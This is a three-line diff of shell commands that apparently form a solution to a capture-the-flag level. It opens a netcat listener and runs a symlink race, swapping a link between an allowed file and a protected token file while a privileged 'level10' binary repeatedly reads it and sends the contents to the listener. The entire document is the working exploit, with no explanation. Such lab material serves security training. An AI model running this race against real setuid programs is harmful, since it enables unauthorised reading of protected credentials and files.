@@ -1,0 +1,3 @@
+nc -lk 6969
+while true; do ln -fs ~/level10 exploit; ln -fs ~/token exploit; done
+while true; do ./level10 exploit 127.0.0.1; done
